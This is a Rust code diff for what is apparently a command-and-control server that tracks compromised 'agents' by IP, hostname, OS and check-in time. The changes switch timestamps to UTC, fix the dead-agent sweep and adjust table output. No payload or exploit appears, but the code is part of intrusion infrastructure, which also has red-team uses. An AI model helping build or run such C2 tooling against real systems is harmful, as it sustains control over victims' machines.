@@ -1,5 +1,5 @@
 use std::{fs::OpenOptions, io::Write, path::{Path, PathBuf}, time::Instant};
-use chrono::Local;
+use chrono::Utc;
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
 use tokio::sync::Mutex;
@@ -86,7 +86,7 @@ impl C2 {
             id: agent_id, 
             status: AgentState::Alive,
             ip: ip.to_string(),
-            last_seen: Local::now(),
+            last_seen: Utc::now(),
             time_compromised: time.parse().unwrap(),
             hostname: hostname.to_string(),
             os: os.to_string(),
@@ -104,7 +104,7 @@ impl C2 {
     }
 
     /// Prints out agents to terminal
-    pub async fn list_agents(&self) {
+    pub async fn _list_agents(&self) {
         let agents = self.agents.lock().await;
         for agent in agents.values() {
             agent.show();
@@ -115,26 +115,21 @@ impl C2 {
         let agents = self.agents.lock().await;
 
         println!(
-            "{:<6} {:<18} {:<14} {:<25} {:<30}",
+            "{:<6} {:<18} {:<10} {:<24} {:<30}",
             "ID", "IP", "Status", "Last Seen", "Session ID"
         );
-        println!("{}", "-".repeat(110));
+        println!("{}", "-".repeat(95));
         for (id, agent) in agents.iter() {
             println!(
-                "{:<6} {:<18} {:<14?} {:<25} {:<30}",
+                "{:<6} {:<18} {:<10} {:<24} {:<30}",
                 id,
                 agent.ip,
                 agent.status,
-                agent.last_seen.format("%Y-%m-%d %H:%M:%S"),
+                format!("  {}", agent.last_seen.format("%Y-%m-%d %H:%M:%S")),
                 agent.session_id
             );
         }
 
-    }
-
-    pub async fn get_agents(&self) -> Vec<Agent> {
-        let agents = self.agents.lock().await;
-        agents.values().cloned().collect()
     }
 
     /// Prints out agent with id to terminal
@@ -207,18 +202,28 @@ impl C2 {
         agents.remove(&id);
     }
 
-    /// Periodically sweeps for dead agents based on last check in time: FIX
+    /// Periodically sweeps for dead agents based on last check in time
     pub async fn sweep_dead_agents(&mut self, timeout: u64) {
-        let now = Instant::now();
+        let now = Utc::now();
         let mut agents = self.agents.lock().await;
+    
         for agent in agents.values_mut() {
-            Logging::DEBUG.print_message(&format!("Agent {} has status {:?}", agent.id, agent.status));
-            if agent.status == AgentState::Alive && now.duration_since(
-                Instant::now() - agent.last_seen.signed_duration_since(
-                    Local::now()).to_std().unwrap()).as_secs() > timeout {
-                agent.update_status(AgentState::Dead);
-                let msg = format!("Agent {} failed to check in", agent.id);
-                Logging::ERROR.print_message(&msg);
+            Logging::DEBUG.print_message(&format!(
+                "Agent {} has status {:?}",
+                agent.id, agent.status
+            ));
+    
+            if agent.status == AgentState::Alive {
+                let duration_since_seen = now.signed_duration_since(agent.last_seen);
+    
+                if duration_since_seen.num_seconds() > timeout as i64 {
+                    agent.update_status(AgentState::Dead);
+                    Logging::ERROR.print_message(&format!(
+                        "Agent {} failed to check in ({} seconds ago)",
+                        agent.id,
+                        duration_since_seen.num_seconds()
+                    ));
+                }
             }
         }
     }
